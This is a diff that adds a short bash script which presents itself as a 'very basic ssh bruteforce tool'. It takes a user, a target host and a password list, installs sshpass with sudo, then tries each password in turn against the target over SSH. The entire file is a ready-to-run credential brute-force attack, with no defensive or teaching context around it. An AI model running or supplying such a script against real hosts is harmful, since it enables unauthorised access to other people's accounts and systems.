@@ -1,0 +1,17 @@
+#!/bin/bash
+#very basic ssh bruteforce tool
+#sshpass should be installed
+
+#pass arguments
+user=$1
+target=$2
+list=$3
+#install or check for updates on sshpass
+sudo apt-get install sshpass
+
+#attempt bruteforce
+while read  p; do
+	echo "attemping to attack "$target" using password "$p""
+	sshpass -p "$p" ssh -t -t "$user"@"$target"
+done < $list
+	
